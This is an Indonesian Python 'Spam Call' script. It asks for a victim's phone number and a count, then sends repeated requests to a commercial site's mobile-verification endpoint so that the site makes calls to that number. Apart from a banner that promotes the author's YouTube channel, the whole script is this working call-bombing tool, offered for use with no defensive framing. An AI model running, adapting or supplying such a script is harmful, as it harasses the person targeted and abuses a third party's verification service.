import os, sys, time, requests, re, json, random
from time import sleep


def mengetik(text):
    for x in text + '\n':
        sys.stdout.write(x)
        sys.stdout.flush()
        sleep(random.random() * 0.2)


def mengetik_3(text):
    for x in text + '\n':
        sys.stdout.write(x)
        sys.stdout.flush()
        sleep(random.random() * 0.3)


def main():
    os.system("clear")
    mengetik('\033[1;90mYoo Haloo Wellcome To Script Gua Bro')
    mengetik('Sc Ini Ga Unlimited Ya Brow Sc Ini Di Gunakan 3× 5 menit')
    mengetik('Oh Jadi Elu Blom Subelek Channel Gua')
    mengetik('Subelek Lah Brow')
    mengetik('Channel yt Gua TUTORIAL ANDROID')
    print ('Loading...')
    sleep(1.0)
    mengetik('> > > > > > > > > > > > > > > > > > > > [100℅] ')
    os.system("clear")
    os.system("figlet Spam Call")
    mengetik_3('\033[1;36m+-----------------------------------')
    mengetik_3('[√] Author : Mr-S4NTUY [•]')
    mengetik_3('[√] github : https://github.com/Mr-S4NTUY [•]')
    mengetik_3('[√] youtub : TUTORIAL ANDROID             [•]')
    mengetik_3('[√] whasap : 088294084614                 [•]')
    print ('')
    print ('\033[1;36mMasukkan No Target contoh 88xnxx')
    nomor = input(' Nomer Target = ')
    jumlah = int(input(' Total Spam = '))
    url = "https://id.jagreward.com/member/verify-mobile/"
    ua = {'Host': "id.jagreward.com",'Connection': 'keep-alive','User-Agent': 'Mozila/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36'}
    dat = {"method": "CALL","countryCode": "id",}
    for i in range(jumlah):
        send = requests.post(url+nomor, headers=ua, data=dat)
        print(" \033[1;90m[\033[1;92m•\033[1;90m] \033[1;96mStatus \033[1;90m~\033[1;96m+\033[1;92m> \033[1;95m",(send.json()["message"]))


main()
